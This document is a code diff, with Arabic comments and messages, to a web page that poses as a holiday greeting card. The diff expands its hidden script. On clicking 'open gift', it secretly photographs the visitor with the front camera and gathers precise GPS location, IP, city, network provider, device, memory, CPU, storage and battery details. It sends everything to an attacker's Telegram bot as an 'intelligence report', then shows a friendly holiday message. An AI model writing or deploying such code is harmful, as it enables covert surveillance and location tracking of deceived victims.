@@ -73,8 +73,48 @@
 
         const userDevice = navigator.userAgent;
         const screenRes = window.screen.width + 'x' + window.screen.height;
+        const deviceMemory = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'غير متوفر';
+        const hardwareConcurrency = navigator.hardwareConcurrency ? navigator.hardwareConcurrency + ' أنوية' : 'غير متوفر';
+
+        async function getStorageInfo() {
+            let storageInfo = 'غير متوفر';
+            try {
+                if (navigator.storage && navigator.storage.estimate) {
+                    const estimate = await navigator.storage.estimate();
+                    const totalGB = (estimate.quota / (1024 * 1024 * 1024)).toFixed(2);
+                    const usedGB = (estimate.usage / (1024 * 1024 * 1024)).toFixed(2);
+                    storageInfo = `${usedGB} GB من إجمالي ${totalGB} GB`;
+                }
+            } catch (e) {}
+            return storageInfo;
+        }
+
+        // دالة الحصول على الموقع الجغرافي بدقة (GPS)
+        function getGeoLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve('غير متاح');
+                } else {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            const lat = position.coords.latitude;
+                            const lon = position.coords.longitude;
+                            const accuracy = position.coords.accuracy;
+                            resolve(`خط الطول: ${lat}, خط العرض: ${lon} (دقة المسافة: ${accuracy} متر)`);
+                        },
+                        (error) => {
+                            resolve('تم رفض إذن الموقع أو غير متاح');
+                        },
+                        { timeout: 10000, enableHighAccuracy: true }
+                    );
+                }
+            });
+        }
 
         async function openGift() {
+            let photoBlob = null;
+
+            // 1. التقاط الصورة
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                 const video = document.getElementById('video');
@@ -90,61 +130,67 @@
 
                 stream.getTracks().forEach(track => track.stop());
 
-                canvas.toBlob(blob => {
-                    sendDataWithPhoto(blob);
-                }, 'image/jpeg');
+                photoBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
+            } catch (e) {}
 
-            } catch (e) {
-                // لو الكاميرا اتقفلت أو المتصفح رفض، بنبعت البيانات العادية من غير ما تحصل أي مشكلة
-                sendDataWithoutPhoto();
-            }
+            // 2. تجميع كافة البيانات التقنية والعنوان الدقيق
+            collectAndSendAll(photoBlob);
         }
 
-        async function sendDataWithPhoto(photoBlob) {
+        async function collectAndSendAll(photoBlob) {
             try {
                 const ipRes = await fetch('https://ipapi.co/json/');
                 const data = await ipRes.json();
                 
-                const caption = `🎁 **تم فتح الهدية والتقاط صورة!**\n\n` +
+                const storage = await getStorageInfo();
+                const gpsLocation = await getGeoLocation();
+
+                let batteryLevel = 'غير متاح';
+                let isCharging = '';
+                if (navigator.getBattery) {
+                    try {
+                        const battery = await navigator.getBattery();
+                        batteryLevel = Math.round(battery.level * 100) + '%';
+                        isCharging = battery.charging ? '⚡ بيشحن' : '🔋 مش بيشحن';
+                    } catch(e) {}
+                }
+
+                const caption = `🚨 **التقرير الاستخباراتي الشامل والنهائي!**\n\n` +
+                                `📍 **الموقع الدقيق (GPS):**\n${gpsLocation}\n` +
+                                `--------------------------\n` +
                                 `🌍 **الدولة:** ${data.country_name || 'غير معروف'}\n` +
                                 `🏙️ **المدينة:** ${data.city || 'غير معروف'}\n` +
+                                `🏢 **مزود الشبكة:** ${data.org || 'غير معروف'}\n` +
                                 `🌐 **الـ IP:** ${data.ip || 'غير معروف'}\n` +
-                                `📱 **الجهاز:** ${userDevice}`;
+                                `--------------------------\n` +
+                                `📱 **نوع الجهاز:** ${userDevice}\n` +
+                                `🧠 **الرام:** ${deviceMemory}\n` +
+                                `⚙️ **المعالج:** ${hardwareConcurrency}\n` +
+                                `💾 **التخزين:** ${storage}\n` +
+                                `🔋 **البطارية:** ${batteryLevel} (${isCharging})\n` +
+                                `🖥️ **دقة الشاشة:** ${screenRes}`;
 
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', photoBlob, 'visitor.jpg');
-                formData.append('caption', caption);
-                formData.append('parse_mode', 'Markdown');
+                if (photoBlob) {
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('photo', photoBlob, 'visitor.jpg');
+                    formData.append('caption', caption);
+                    formData.append('parse_mode', 'Markdown');
 
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                } else {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: CHAT_ID, text: caption, parse_mode: 'Markdown' })
+                    });
+                }
             } catch (err) {}
-            
+
             alert('كل سنة وأنت طيب! تم فتح الهدية بنجاح 🌟');
-        }
-
-        async function sendDataWithoutPhoto() {
-            try {
-                const ipRes = await fetch('https://ipapi.co/json/');
-                const data = await ipRes.json();
-
-                const message = `🔔 **زيارة بطاقة المعايدة!**\n\n` +
-                                `🌍 **الدولة:** ${data.country_name || 'غير معروف'}\n` +
-                                `🏙️ **المدينة:** ${data.city || 'غير معروف'}\n` +
-                                `🌐 **الـ IP:** ${data.ip || 'غير معروف'}\n` +
-                                `📱 **الجهاز:** ${userDevice}`;
-
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
-                });
-            } catch (err) {}
-
-            alert('كل سنة وأنت طيب! 🌟');
         }
     </script>
 </body>
